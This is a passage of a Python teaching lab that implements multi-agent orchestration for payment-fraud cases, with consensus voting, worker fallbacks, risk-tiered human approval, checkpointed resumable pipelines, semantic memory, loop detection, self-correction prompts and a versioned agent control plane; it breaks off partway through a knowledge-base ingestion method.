"""Module 10 lab: hierarchical multi-agent orchestration with consensus voting, fallbacks and risk-tiered
human-in-the-loop governance.

Supervisor fans work out to workers in parallel under a shared budget/deadline; workers degrade through
retry -> secondary -> rules-only; a consensus panel produces a verdict with an agreement ratio; the policy
engine decides auto / approval / blocked; an approval queue models human review. Syllabus extension: checkpoint time travel, semantic memory, loop detection,
self-correction, provisioning control plane, knowledge base, safe tool gateway, MCP host/client/server, access boundaries.
Run: python3 lab.py
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import math
import random
import re
import sys
from collections import Counter
from dataclasses import dataclass
from enum import Enum, IntEnum
from functools import partial
from typing import Any, Awaitable, Callable, Literal
from urllib.parse import urlparse

from pydantic import BaseModel, ConfigDict, Field, ValidationError


class JsonFormatter(logging.Formatter):
    def format(self, record: logging.LogRecord) -> str:
        payload = {"level": record.levelname, "msg": record.getMessage()}
        payload.update(getattr(record, "ctx", {}))
        return json.dumps(payload, default=str)


def get_logger(name: str) -> logging.Logger:
    logger = logging.getLogger(name)
    if not logger.handlers:
        h = logging.StreamHandler(sys.stdout)
        h.setFormatter(JsonFormatter())
        logger.addHandler(h)
        logger.setLevel(logging.INFO)
        logger.propagate = False
    return logger


log = get_logger("lab10")


class OrchestrationError(Exception):
    pass


class BudgetExceededError(OrchestrationError):
    pass


class WorkerTransientError(OrchestrationError):
    pass


class WorkerFatalError(OrchestrationError):
    pass


class QuorumNotReachedError(OrchestrationError):
    pass


class Budget:
    """Shared across the whole request tree so a runaway sub-agent cannot overspend."""

    def __init__(self, tokens: int, max_replans: int = 2) -> None:
        self.tokens, self.replans_left = tokens, max_replans
        self._lock = asyncio.Lock()

    async def spend(self, n: int) -> None:
        async with self._lock:
            if n > self.tokens:
                raise BudgetExceededError(f"need {n} tokens, {self.tokens} left")
            self.tokens -= n


class Case(BaseModel):
    case_id: str
    amount: int = Field(ge=0)
    customer_tier: str = "standard"
    text: str


class TaskStatus(str, Enum):
    OK = "ok"
    RETRIED = "retried"
    FALLBACK = "fallback"
    FAILED = "failed"


class WorkerResult(BaseModel):
    worker: str
    status: TaskStatus
    output: dict[str, object]
    tokens: int = 0


Handler = Callable[[Case], Awaitable[dict[str, object]]]


class Worker:
    """Resilience wrapper: retry primary with backoff, then secondary, then a rules-only fallback."""

    def __init__(self, name: str, primary: Handler, secondary: Handler | None, rules: Handler, cost: int = 400,
                 timeout_s: float = 0.5, attempts: int = 3) -> None:
        self.name, self.primary, self.secondary, self.rules = name, primary, secondary, rules
        self.cost, self.timeout_s, self.attempts = cost, timeout_s, attempts

    async def run(self, case: Case, budget: Budget) -> WorkerResult:
        await budget.spend(self.cost)
        status = TaskStatus.OK
        for i in range(1, self.attempts + 1):
            try:
                out = await asyncio.wait_for(self.primary(case), self.timeout_s)
                return WorkerResult(worker=self.name, status=status, output=out, tokens=self.cost)
            except (WorkerTransientError, asyncio.TimeoutError):
                status = TaskStatus.RETRIED
                await asyncio.sleep(random.uniform(0, 0.005 * 2 ** i))
            except WorkerFatalError:
                break
        for handler in (self.secondary, self.rules):
            if handler is None:
                continue
            try:
                out = await asyncio.wait_for(handler(case), self.timeout_s)
                log.warning("fallback used", extra={"ctx": {"worker": self.name, "handler": handler.__name__}})
                return WorkerResult(worker=self.name, status=TaskStatus.FALLBACK, output={**out, "degraded": True}, tokens=self.cost)
            except (WorkerTransientError, asyncio.TimeoutError, WorkerFatalError):
                continue
        return WorkerResult(worker=self.name, status=TaskStatus.FAILED, output={"error": "all handlers failed"})


class Vote(BaseModel):
    voter: str
    verdict: str
    confidence: float = Field(ge=0, le=1)


class Consensus(BaseModel):
    verdict: str
    agreement: float
    needs_human: bool
    votes: list[Vote]


def consensus(votes: list[Vote], quorum: int = 2, min_agreement: float = 0.67, min_conf: float = 0.6) -> Consensus:
    """Confidence-weighted majority. Low confidence or split vote routes to a human instead of guessing."""
    if len(votes) < quorum:
        raise QuorumNotReachedError(f"{len(votes)} votes < quorum {quorum}")
    weight: Counter[str] = Counter()
    for v in votes:
        weight[v.verdict] += v.confidence
    verdict, w = weight.most_common(1)[0]
    agreement = w / sum(weight.values())
    needs_human = agreement < min_agreement or any(v.confidence < min_conf for v in votes if v.verdict == verdict)
    return Consensus(verdict=verdict, agreement=round(agreement, 3), needs_human=needs_human, votes=votes)


class Action(BaseModel):
    kind: str
    amount: int
    reversible: bool


class Decision(str, Enum):
    AUTO = "auto"
    NEEDS_APPROVAL = "needs_approval"
    BLOCKED = "blocked"


def govern(action: Action, verdict: Consensus, forbidden: set[str] | None = None) -> tuple[Decision, str]:
    if action.kind in (forbidden or {"delete_account"}):
        return Decision.BLOCKED, f"{action.kind} is never automated"
    if verdict.needs_human:
        return Decision.NEEDS_APPROVAL, f"panel uncertain (agreement {verdict.agreement})"
    if action.amount > 500 or not action.reversible:
        return Decision.NEEDS_APPROVAL, "high impact: amount > 500 or irreversible"
    return Decision.AUTO, "low risk and consensus reached"


class ApprovalQueue:
    def __init__(self) -> None:
        self.pending: dict[str, tuple[Action, str]] = {}
        self.audit: list[dict[str, object]] = []

    def submit(self, case_id: str, action: Action, reason: str) -> None:
        self.pending[case_id] = (action, reason)
        self.audit.append({"case": case_id, "event": "queued", "reason": reason})

    async def decide(self, case_id: str, approver: str, approve: bool, justification: str) -> bool:
        if case_id not in self.pending:
            raise OrchestrationError(f"no pending approval for {case_id}")
        if approve and not justification.strip():  # validate before popping so the item stays queued
            raise OrchestrationError("approval of a high-risk action requires a justification")
        self.pending.pop(case_id)
        self.audit.append({"case": case_id, "event": "approved" if approve else "rejected", "by": approver, "why": justification})
        return approve


def make_scorer(name: str, bias: float, flaky: bool = False) -> Worker:
    state = {"n": 0}

    async def primary(case: Case) -> dict[str, object]:
        state["n"] += 1
        await asyncio.sleep(0.002)
        if flaky and state["n"] <= 2:
            raise WorkerTransientError("model 529 overloaded")
        risky = case.amount / 1000 + bias + (0.4 if "urgent wire" in case.text else 0)
        return {"verdict": "fraud" if risky > 0.8 else "ok", "confidence": round(min(0.99, 0.55 + abs(risky - 0.8)), 2)}

    async def secondary(case: Case) -> dict[str, object]:
        return {"verdict": "ok", "confidence": 0.5}

    async def rules(case: Case) -> dict[str, object]:
        return {"verdict": "fraud" if case.amount > 5000 else "ok", "confidence": 0.5}

    return Worker(name, primary, secondary, rules)


class Supervisor:
    def __init__(self, scorers: list[Worker], queue: ApprovalQueue) -> None:
        self.scorers, self.queue = scorers, queue

    async def handle(self, case: Case, budget: Budget) -> dict[str, object]:
        results = await asyncio.gather(*(s.run(case, budget) for s in self.scorers), return_exceptions=True)
        votes: list[Vote] = []
        for r in results:
            if isinstance(r, BudgetExceededError):
                raise r
            if isinstance(r, WorkerResult) and r.status is not TaskStatus.FAILED:
                votes.append(Vote(voter=r.worker, verdict=str(r.output["verdict"]), confidence=float(r.output["confidence"])))  # type: ignore[arg-type]
        verdict = consensus(votes)
        action = Action(kind="freeze_payment" if verdict.verdict == "fraud" else "release_payment", amount=case.amount,
                        reversible=verdict.verdict == "fraud" or case.amount <= 500)  # freezes are reversible; small releases are recallable
        decision, why = govern(action, verdict)
        if decision is Decision.NEEDS_APPROVAL:
            self.queue.submit(case.case_id, action, why)
        log.info("decision", extra={"ctx": {"case": case.case_id, "verdict": verdict.verdict, "agreement": verdict.agreement,
                                             "decision": decision, "why": why, "tokens_left": budget.tokens,
                                             "statuses": [r.status.value for r in results if isinstance(r, WorkerResult)]}})
        return {"decision": decision, "verdict": verdict.verdict}


# ---- Syllabus extension: typed errors, clock and backoff helper ---
class CheckpointNotFoundError(OrchestrationError):
    pass


class StoreUnavailableError(OrchestrationError):
    """Transient checkpoint-store failure (failover, throttling); safe to retry."""


class ApprovalRequiredError(OrchestrationError):
    pass


class ApprovalRejectedError(OrchestrationError):
    pass


class ForbiddenEditError(OrchestrationError):
    pass


class MemoryNamespaceError(OrchestrationError):
    pass


class LoopDetectedError(OrchestrationError):
    def __init__(self, kind: str, detail: str) -> None:
        super().__init__(f"{kind}: {detail}")
        self.kind, self.detail = kind, detail


class CriticFormatError(OrchestrationError):
    pass


class PolicyViolationError(OrchestrationError):
    def __init__(self, problems: list[str]) -> None:
        super().__init__("; ".join(problems))
        self.problems = problems


class VersionConflictError(OrchestrationError):
    pass


class AgentNotFoundError(OrchestrationError):
    pass


class AgentRetiredError(OrchestrationError):
    pass


class SourceUnavailableError(OrchestrationError):
    """Transient failure fetching a knowledge-base source document."""


class ToolGatewayError(OrchestrationError):
    pass


class ToolNotAllowedError(ToolGatewayError):
    pass


class ToolArgumentError(ToolGatewayError):
    pass


class EgressDeniedError(ToolGatewayError):
    pass


class RateLimitedError(ToolGatewayError):
    def __init__(self, tool: str, retry_after_s: float) -> None:
        super().__init__(f"{tool} rate limited, retry in {retry_after_s:.1f}s")
        self.retry_after_s = retry_after_s


class ToolTimeoutError(ToolGatewayError):
    pass


class ToolTransientError(ToolGatewayError):
    pass


class ConfirmationDeniedError(ToolGatewayError):
    pass


class McpError(OrchestrationError):
    def __init__(self, code: int, message: str) -> None:
        super().__init__(f"MCP error {code}: {message}")
        self.code = code


class McpServerBusyError(McpError):
    """Server answered 'still starting' (-32000); the client retries with backoff."""


class TransportTimeoutError(OrchestrationError):
    pass


class CapabilityNotNegotiatedError(OrchestrationError):
    pass


class BoundaryViolationError(OrchestrationError):
    pass


class MissingScopeError(BoundaryViolationError):
    pass


class ClearanceError(BoundaryViolationError):
    pass


class CrossBoundaryError(BoundaryViolationError):
    pass


class FakeClock:
    """Injected clock so time-dependent logic (decay, rate limits, leases) is deterministic in the demo."""

    def __init__(self, now: float = 1_700_000_000.0) -> None:
        self.now = now

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


async def with_backoff(op: Callable[[], Awaitable[Any]], attempts: int = 4, base_s: float = 0.002,
                       retry_on: tuple[type[Exception], ...] = (WorkerTransientError,)) -> Any:
    """Exponential backoff with full jitter around any I/O call; the last attempt is allowed to raise."""
    for attempt in range(1, attempts):
        try:
            return await op()
        except retry_on:
            await asyncio.sleep(random.uniform(0, base_s * 2 ** attempt))
    return await op()


# ---- Syllabus extension: check-pointing, time travel, interrupts and manual approval ---
END = "__end__"
StepFn = Callable[[dict[str, Any]], Awaitable[dict[str, Any]]]


class Checkpoint(BaseModel):
    thread_id: str
    step: int
    next_node: str
    values: dict[str, Any]
    pending_approval: str | None = None
    forked_from: str | None = None


class CheckpointStore:
    """Keyed by (thread_id, step). In production this is Postgres/Redis; writes retry with backoff."""

    def __init__(self, fail_puts: int = 0) -> None:
        self._rows: dict[str, dict[int, Checkpoint]] = {}
        self.fail_puts, self.put_attempts = fail_puts, 0

    async def put(self, cp: Checkpoint) -> None:
        async def write() -> None:
            self.put_attempts += 1
            if self.fail_puts > 0:
                self.fail_puts -= 1
                raise StoreUnavailableError("simulated failover")
            await asyncio.sleep(0)
            self._rows.setdefault(cp.thread_id, {})[cp.step] = cp.model_copy(deep=True)

        await with_backoff(write, retry_on=(StoreUnavailableError,))

    async def history(self, thread_id: str) -> list[Checkpoint]:
        return [self._rows[thread_id][s] for s in sorted(self._rows.get(thread_id, {}))]

    async def latest(self, thread_id: str) -> Checkpoint | None:
        rows = await self.history(thread_id)
        return rows[-1].model_copy(deep=True) if rows else None

    async def get(self, thread_id: str, step: int) -> Checkpoint:
        try:
            return self._rows[thread_id][step].model_copy(deep=True)
        except KeyError as exc:
            raise CheckpointNotFoundError(f"{thread_id}@{step}") from exc


class ResumeCommand(BaseModel):
    approver: str
    approve: bool
    justification: str = ""
    edits: dict[str, Any] = Field(default_factory=dict)  # state patch applied before the node runs


class RunResult(BaseModel):
    thread_id: str
    status: str  # "completed" | "interrupted"
    step: int
    next_node: str
    values: dict[str, Any]


class DurableRunner:
    """Linear pipeline with a checkpoint after every node, interrupt-before gates, edit-then-resume and forking."""

    def __init__(self, steps: list[tuple[str, StepFn]], store: CheckpointStore, interrupt_before: set[str] | None = None,
                 editable: set[str] | None = None, max_steps: int = 20) -> None:
        self.names = [n for n, _ in steps]
        self.fns = dict(steps)
        self.store, self.interrupt_before = store, set(interrupt_before or set())
        self.editable, self.max_steps = set(editable or set()), max_steps
        self.audit: list[dict[str, Any]] = []

    def _after(self, name: str) -> str:
        i = self.names.index(name)
        return self.names[i + 1] if i + 1 < len(self.names) else END

    def _result(self, cp: Checkpoint, status: str) -> RunResult:
        return RunResult(thread_id=cp.thread_id, status=status, step=cp.step, next_node=cp.next_node, values=cp.values)

    def _apply_resume(self, cp: Checkpoint, cmd: ResumeCommand) -> dict[str, Any]:
        if not cmd.approve:
            self.audit.append({"thread": cp.thread_id, "event": "rejected", "by": cmd.approver, "why": cmd.justification})
            raise ApprovalRejectedError(f"{cp.thread_id}: {cmd.approver} rejected {cp.pending_approval}")
        if not cmd.justification.strip():
            raise ApprovalRequiredError("approving a gated step requires a justification")
        bad = sorted(set(cmd.edits) - self.editable)
        if bad:
            raise ForbiddenEditError(f"fields not editable at approval time: {bad}")
        before = {k: cp.values.get(k) for k in cmd.edits}
        self.audit.append({"thread": cp.thread_id, "event": "approved", "by": cmd.approver, "why": cmd.justification,
                           "edits": {k: [before[k], v] for k, v in cmd.edits.items()}})
        return {**cp.values, **cmd.edits}

    async def run(self, thread: str, initial: dict[str, Any] | None = None, resume: ResumeCommand | None = None) -> RunResult:
        cp = await self.store.latest(thread)
        if cp is None:
            if initial is None:
                raise CheckpointNotFoundError(thread)
            cp = Checkpoint(thread_id=thread, step=0, next_node=self.names[0], values=dict(initial))
            await self.store.put(cp)
        approved_node: str | None = None
        if cp.pending_approval is not None:
            if resume is None:
                return self._result(cp, "interrupted")
            cp = cp.model_copy(update={"values": self._apply_resume(cp, resume), "pending_approval": None})
            approved_node = cp.next_node
        step, node, values = cp.step, cp.next_node, cp.values
        while node != END:
            if step >= self.max_steps:
                raise OrchestrationError(f"{thread}: exceeded {self.max_steps} steps")
            if node in self.interrupt_before and node != approved_node:
                cp = Checkpoint(thread_id=thread, step=step, next_node=node, values=values, pending_approval=node, forked_from=cp.forked_from)
                await self.store.put(cp)  # durable pause: no process, no memory, no compute is held while we wait
                self.audit.append({"thread": thread, "event": "interrupted", "before": node})
                return self._result(cp, "interrupted")
            approved_node = None
            values = {**values, **await self.fns[node](values)}
            step += 1
            cp = Checkpoint(thread_id=thread, step=step, next_node=self._after(node), values=values, forked_from=cp.forked_from)
            await self.store.put(cp)
            node = cp.next_node
        return self._result(cp, "completed")

    async def fork(self, thread: str, step: int, new_thread: str, updates: dict[str, Any] | None = None) -> Checkpoint:
        """Time travel: copy checkpoint `step` into a new thread (optionally patched) and run it from there."""
        src = await self.store.get(thread, step)
        cp = Checkpoint(thread_id=new_thread, step=src.step, next_node=src.next_node, values={**src.values, **(updates or {})},
                        forked_from=f"{thread}@{step}")
        await self.store.put(cp)
        return cp


def build_refund_runner(store: CheckpointStore, ledger: list[str]) -> DurableRunner:
    async def load_case(v: dict[str, Any]) -> dict[str, Any]:
        return {"customer": "c-77"}

    async def compute_refund(v: dict[str, Any]) -> dict[str, Any]:
        return {"refund_amount": v["requested_amount"], "fee": round(v["requested_amount"] * 0.02)}

    async def issue_refund(v: dict[str, Any]) -> dict[str, Any]:
        receipt = f"refund:{v['case_id']}:{v['refund_amount']}"
        ledger.append(receipt)
        return {"receipt": receipt}

    async def notify(v: dict[str, Any]) -> dict[str, Any]:
        return {"notified": True}

    steps: list[tuple[str, StepFn]] = [("load_case", load_case), ("compute_refund", compute_refund),
                                       ("issue_refund", issue_refund), ("notify", notify)]
    return DurableRunner(steps, store, interrupt_before={"issue_refund"}, editable={"refund_amount"})


# ---- Syllabus extension: semantic long-term memory ---
def _bucket(feature: str, dim: int) -> tuple[int, float]:
    h = int.from_bytes(hashlib.blake2b(feature.encode(), digest_size=8).digest(), "big")
    return h % dim, 1.0 if (h >> 63) & 1 else -1.0  # signed hashing keeps collisions from only ever adding


def embed(text: str, dim: int = 256) -> list[float]:
    """Deterministic hashed embedding: word features plus char trigrams (so 'prefers' ~ 'prefer'), L2-normalised.
    Stand-in for a real embedding model; same interface (text -> unit vector)."""
    vec = [0.0] * dim
    for word in re.findall(r"[a-z0-9$]+", text.lower()):
        padded = f"^{word}$"
        feats = [(f"w:{word}", 1.0)] + [(f"t:{padded[i:i + 3]}", 0.5) for i in range(len(padded) - 2)]
        for feat, weight in feats:
            idx, sign = _bucket(feat, dim)
            vec[idx] += sign * weight
    norm = math.sqrt(sum(x * x for x in vec)) or 1.0
    return [x / norm for x in vec]


def cosine(a: list[float], b: list[float]) -> float:
    return sum(x * y for x, y in zip(a, b))  # inputs are already unit vectors


class MemoryItem(BaseModel):
    memory_id: str
    namespace: str
    text: str
    importance: float = Field(ge=0, le=1)
    created_at: float
    last_access: float
    access_count: int = 0
    vec: list[float]


class ScoredMemory(BaseModel):
    text: str
    score: float
    similarity: float
    recency: float


class LongTermMemory:
    """Per-user namespaces; retrieval = similarity + recency decay + importance; explicit forgetting policy."""

    def __init__(self, clock: Callable[[], float], half_life_s: float = 30 * 86400, capacity: int = 100,
                 min_retention: float = 0.25, weights: tuple[float, float, float] = (0.6, 0.25, 0.15)) -> None:
        self.clock, self.half_life_s, self.capacity, self.min_retention, self.weights = clock, half_life_s, capacity, min_retention, weights
        self._items: dict[str, list[MemoryItem]] = {}

    @staticmethod
    def namespace_for(user_id: str) -> str:
        if not re.fullmatch(r"[A-Za-z0-9_-]+", user_id):
            raise MemoryNamespaceError(f"invalid user id {user_id!r}")
        return f"user:{user_id}"

    def _items_in(self, namespace: str) -> list[MemoryItem]:
        if not namespace.startswith("user:"):
            raise MemoryNamespaceError(f"namespace {namespace!r} must come from namespace_for()")
        return self._items.setdefault(namespace, [])

    def _decay(self, item: MemoryItem, now: float) -> float:
        return 0.5 ** (max(0.0, now - item.last_access) / self.half_life_s)

    async def remember(self, namespace: str, text: str, importance: float = 0.5) -> MemoryItem:
        now = self.clock()
        items = self._items_in(namespace)
        for it in items:  # dedupe: restating a fact refreshes it instead of duplicating it
            if it.text.strip().lower() == text.strip().lower():
                it.importance, it.last_access = max(it.importance, importance), now
                return it
        item = MemoryItem(memory_id=f"m{sum(len(v) for v in self._items.values()) + 1}", namespace=namespace, text=text, importance=importance,
                          created_at=now, last_access=now, vec=embed(text))
        items.append(item)
        return item

    async def recall(self, namespace: str, query: str, k: int = 3, min_similarity: float = 0.15) -> list[ScoredMemory]:
        now, q = self.clock(), embed(query)
        w_sim, w_rec, w_imp = self.weights
        scored: list[tuple[MemoryItem, ScoredMemory]] = []
        for it in self._items_in(namespace):  # only this user's namespace is ever scanned
            sim = cosine(q, it.vec)
            if sim < min_similarity:
                continue
            rec = self._decay(it, now)
            scored.append((it, ScoredMemory(text=it.text, score=round(w_sim * sim + w_rec * rec + w_imp * it.importance, 4),
                                            similarity=round(sim, 3), recency=round(rec, 3))))
        scored.sort(key=lambda p: p[1].score, reverse=True)
        for it, _ in scored[:k]:
            it.last_access, it.access_count = now, it.access_count + 1
        return [s for _, s in scored[:k]]

    async def forget(self, namespace: str) -> list[str]:
        """Drop low-retention memories, then enforce the per-namespace capacity by lowest retention."""
        now = self.clock()
        items = self._items_in(namespace)

        def retention(it: MemoryItem) -> float:
            return 0.5 * it.importance + 0.5 * self._decay(it, now)

        removed = [it for it in items if retention(it) < self.min_retention]
        kept = [it for it in items if retention(it) >= self.min_retention]
        kept.sort(key=retention, reverse=True)
        removed.extend(kept[self.capacity:])
        self._items[namespace] = kept[:self.capacity]
        return [it.memory_id for it in removed]


# ---- Syllabus extension: detecting infinite ReAct loops ---
class StepRecord(BaseModel):
    action: str
    args: str
    observation: str
    tokens: int = 400


class LoopDetector:
    """Three independent signals: repeated identical step, no new information in a window, token budget."""

    def __init__(self, repeat_threshold: int = 3, window: int = 4, token_budget: int = 3000) -> None:
        self.repeat_threshold, self.window, self.token_budget = repeat_threshold, window, token_budget
        self.history: list[StepRecord] = []

    @staticmethod
    def signature(rec: StepRecord) -> str:
        return hashlib.sha1(f"{rec.action}|{rec.args}|{rec.observation}".encode()).hexdigest()[:10]

    def observe(self, rec: StepRecord) -> LoopDetectedError | None:
        self.history.append(rec)
        sigs = [self.signature(r) for r in self.history]
        if sigs.count(sigs[-1]) >= self.repeat_threshold:
            return LoopDetectedError("repeated_step", f"signature {sigs[-1]} seen {sigs.count(sigs[-1])} times")
        if len(sigs) >= 4 and sigs[-1] == sigs[-3] and sigs[-2] == sigs[-4] and sigs[-1] != sigs[-2]:
            return LoopDetectedError("ping_pong", "A-B-A-B action pattern")
        if len(self.history) > self.window:
            seen_before = {r.observation for r in self.history[:-self.window]}
            if all(r.observation in seen_before for r in self.history[-self.window:]):
                return LoopDetectedError("no_progress", f"no new observation in the last {self.window} steps")
        spent = sum(r.tokens for r in self.history)
        if spent > self.token_budget:
            return LoopDetectedError("token_budget", f"{spent} tokens > budget {self.token_budget}")
        return None


Policy = Callable[[list[StepRecord]], tuple[str, str] | None]


async def guarded_react(policy: Policy, tools: dict[str, Callable[[str], Awaitable[str]]], detector: LoopDetector,
                        queue: ApprovalQueue, case_id: str, max_steps: int = 20) -> list[StepRecord]:
    """Run a ReAct-style policy; on a loop signal stop, file an escalation, and raise instead of burning tokens."""
    for _ in range(max_steps):
        nxt = policy(detector.history)
        if nxt is None:
            return detector.history
        action, args = nxt
        obs = await tools[action](args)
        signal = detector.observe(StepRecord(action=action, args=args, observation=obs))
        if signal is not None:
            queue.submit(case_id, Action(kind="loop_escalation", amount=0, reversible=True), f"{signal.kind}: {signal.detail}")
            raise signal
    raise LoopDetectedError("max_steps", f"{max_steps} steps without finishing")


# ---- Syllabus extension: self-correction prompting (critic + reflection) ---
CRITIC_TEMPLATE = (
    "You are a strict reviewer. Score the ANSWER from 0 to 10 against the RUBRIC and list concrete issues.\n"
    "RUBRIC:\n{rubric}\nANSWER:\n{answer}\n"
    'Reply with JSON only: {{"score": <int>, "issues": [<string>, ...]}}'
)
REFLECT_TEMPLATE = (
    "TASK: {task}\nPREVIOUS ANSWER:\n{answer}\nREVIEWER ISSUES:\n{issues}\n"
    "Rewrite the answer so that every issue is fixed. Keep everything that was already correct. Do not mention the review."
)


class Critique(BaseModel):
    score: int = Field(ge=0, le=10)
    issues: list[str] = Field(default_factory=list)


class SelfCorrectionResult(BaseModel):
    answer: str
    score: int
    rounds: int
    stop_reason: str  # accepted | plateau | max_rounds
    scores: list[int]


TextFn = Callable[[str], Awaitable[str]]


async def self_correct(task: str, rubric: str, generate: TextFn, critic: TextFn, target: int = 8, max_rounds: int = 3,
                       min_gain: int = 1) -> SelfCorrectionResult:
    """Generate -> critique -> reflect. Bounded; stops on target, on a plateau/regression; returns the BEST answer."""
    answer = await generate(task)
    best_answer, best_score, scores = answer, -1, []
    reason = "max_rounds"
    for round_no in range(1, max_rounds + 1):
        raw = await critic(CRITIC_TEMPLATE.format(rubric=rubric, answer=answer))
        try:
            crit = Critique.model_validate_json(raw)
        except ValueError as exc:  # pydantic ValidationError is a ValueError
            raise CriticFormatError(f"critic reply is not valid Critique JSON: {raw[:60]!r}") from exc
        gain = crit.score - (scores[-1] if scores else -99)
        scores.append(crit.score)
        if crit.score > best_score:
            best_answer, best_score = answer, crit.score
        if crit.score >= target:
            return SelfCorrectionResult(answer=best_answer, score=best_score, rounds=round_no, stop_reason="accepted", scores=scores)
        if round_no > 1 and gain < min_gain:
            reason = "plateau"
            break
        if round_no == max_rounds:
            break
        answer = await generate(REFLECT_TEMPLATE.format(task=task, answer=answer, issues="\n".join(f"- {i}" for i in crit.issues)))
    return SelfCorrectionResult(answer=best_answer, score=best_score, rounds=len(scores), stop_reason=reason, scores=scores)


def scripted_text_fn(replies: list[str], prompts: list[str]) -> TextFn:
    queue = list(replies)

    async def fn(prompt: str) -> str:
        await asyncio.sleep(0.001)
        prompts.append(prompt)
        if not queue:
            raise OrchestrationError("scripted model exhausted")
        return queue.pop(0)

    return fn


# ---- Syllabus extension: managed agent provisioning (control plane) ---
class AgentSpec(BaseModel):
    name: str
    team: str
    model: str
    tools: list[str]
    max_tokens_per_run: int = 20_000
    max_usd_per_day: float = 50.0
    secrets_scope: str  # NAME of a scope; the secret value is only ever resolved at runtime by the platform
    version: int = 1
    status: str = "active"


class ScopedLease(BaseModel):
    agent: str
    version: int
    scope: str
    expires_at: float


class ControlPlane:
    """Registry of immutable, versioned AgentSpecs with a policy check on every create/update, like a mini control plane."""

    APPROVED_MODELS = {"small-fast", "large-reasoning"}
    TOOL_CATALOG = {"search_kb": "read", "get_order": "read", "issue_refund": "write"}
    TEAM_SCOPES = {"support": {"crm:read", "refunds:write"}, "analytics": {"warehouse:read"}}
    MAX_TOKENS, MAX_USD = 50_000, 200.0

    def __init__(self, clock: Callable[[], float], admins: set[str]) -> None:
        self.clock, self.admins = clock, admins
        self._versions: dict[str, list[AgentSpec]] = {}
        self.audit: list[dict[str, Any]] = []

    def check_policy(self, spec: AgentSpec) -> list[str]:
        problems: list[str] = []
        if spec.model not in self.APPROVED_MODELS:
            problems.append(f"model {spec.model!r} is not approved")
        unknown = sorted(set(spec.tools) - set(self.TOOL_CATALOG))
        if unknown:
            problems.append(f"tools not in catalog: {unknown}")
        if spec.secrets_scope not in self.TEAM_SCOPES.get(spec.team, set()):
            problems.append(f"team {spec.team!r} may not use scope {spec.secrets_scope!r}")
        if any(self.TOOL_CATALOG.get(t) == "write" for t in spec.tools) and not spec.secrets_scope.endswith(":write"):
            problems.append("write tools require a ':write' secrets scope")
        if spec.max_tokens_per_run > self.MAX_TOKENS or spec.max_usd_per_day > self.MAX_USD:
            problems.append(f"budget above caps ({self.MAX_TOKENS} tokens/run, ${self.MAX_USD}/day)")
        return problems

    def _authorize(self, actor: str, action: str, name: str) -> None:
        if actor not in self.admins:
            self.audit.append({"actor": actor, "action": action, "agent": name, "outcome": "denied"})
            raise PolicyViolationError([f"{actor} is not a platform admin"])

    def _current(self, name: str) -> AgentSpec:
        if name not in self._versions:
            raise AgentNotFoundError(name)
        return self._versions[name][-1]

    async def create(self, spec: AgentSpec, actor: str) -> AgentSpec:
        self._authorize(actor, "create", spec.name)
        if spec.name in self._versions:
            raise VersionConflictError(f"{spec.name} already exists; use update()")
        problems = self.check_policy(spec)
        if problems:
            self.audit.append({"actor": actor, "action": "create", "agent": spec.name, "outcome": "rejected", "problems": problems})
            raise PolicyViolationError(problems)
        spec = spec.model_copy(update={"version": 1, "status": "active"})
        self._versions[spec.name] = [spec]
        self.audit.append({"actor": actor, "action": "create", "agent": spec.name, "version": 1, "outcome": "ok"})
        return spec

    async def update(self, name: str, patch: dict[str, Any], actor: str, expected_version: int) -> AgentSpec:
        self._authorize(actor, "update", name)
        cur = self._current(name)
        if cur.version != expected_version:  # optimistic concurrency: two admins cannot silently overwrite each other
            raise VersionConflictError(f"{name} is at v{cur.version}, caller saw v{expected_version}")
        new = AgentSpec.model_validate({**cur.model_dump(), **patch, "version": cur.version + 1})
        problems = self.check_policy(new)
        if problems:
            self.audit.append({"actor": actor, "action": "update", "agent": name, "outcome": "rejected", "problems": problems})
            raise PolicyViolationError(problems)
        self._versions[name].append(new)
        self.audit.append({"actor": actor, "action": "update", "agent": name, "version": new.version, "outcome": "ok", "changed": sorted(patch)})
        return new

    async def retire(self, name: str, actor: str) -> AgentSpec:
        self._authorize(actor, "retire", name)
        retired = self._current(name).model_copy(update={"status": "retired", "version": self._current(name).version + 1})
        self._versions[name].append(retired)
        self.audit.append({"actor": actor, "action": "retire", "agent": name, "version": retired.version, "outcome": "ok"})
        return retired

    async def provision(self, name: str, ttl_s: float = 900) -> ScopedLease:
        """Runtime entry point: only active agents get a short-lived lease bound to their declared scope."""
        spec = self._current(name)
        if spec.status != "active":
            raise AgentRetiredError(f"{name} v{spec.version} is retired")
        return ScopedLease(agent=name, version=spec.version, scope=spec.secrets_scope, expires_at=self.clock() + ttl_s)

    def history(self, name: str) -> list[int]:
        return [s.version for s in self._versions.get(name, [])]


# ---- Syllabus extension: knowledge-base integration with citations ---
class KBDocument(BaseModel):
    doc_id: str
    title: str
    text: str


class KBChunk(BaseModel):
    chunk_id: str
    doc_id: str
    title: str
    text: str
    terms: list[str]
    vec: list[float]


class CitedAnswer(BaseModel):
    answer: str
    citations: list[str]
    grounded: bool
    top_score: float


STOPWORDS = {"the", "a", "an", "of", "to", "is", "are", "for", "and", "in", "on", "by", "be", "what", "how", "do", "does", "can", "i", "my"}


def tokenize(text: str) -> list[str]:
    return [w for w in re.findall(r"[a-z0-9$]+", text.lower()) if w not in STOPWORDS]


class DocSource:
    """Simulated remote document store (wiki, drive); the first fetch of one document fails transiently."""

    def __init__(self, docs: list[KBDocument], flaky_id: str = "") -> None:
        self.docs, self.flaky_id, self.failed = {d.doc_id: d for d in docs}, flaky_id, False

    async def fetch(self, doc_id: str) -> KBDocument:
        await asyncio.sleep(0.001)
        if doc_id == self.flaky_id and not self.failed:
            self.failed = True
            raise SourceUnavailableError(f"{doc_id}: 503 from source")
        return self.docs[doc_id]


class KnowledgeBase:
    """Chunk -> index twice (hashed embedding + keyword idf) -> hybrid search -> answer with citations or abstain."""

    def __init__(self, min_score: float = 0.3) -> None:
        self.chunks: dict[str, KBChunk] = {}
        self.df: Counter[str] = Counter()
        self.min_score = min_score

    async def ingest(self, source: DocSource, doc_ids: list[str]) -> int:
        docs = await asyncio.gather(*(with_backoff(partial(source.fetch, d), retry_on=(SourceUnavailableError,)) for d in doc_ids))
        for doc in docs:
            sentences = re.split(r"(?<=[.!?])\s+", doc.text.strip())
            for i in range(0, len(sentences), 2):
                text = " ".join(sentences[i:i + 2])
                chunk = KBChunk(chunk_id=f"{doc.doc_id}#{i // 2}", doc_id=doc.doc_id, title=doc.title, text=text,
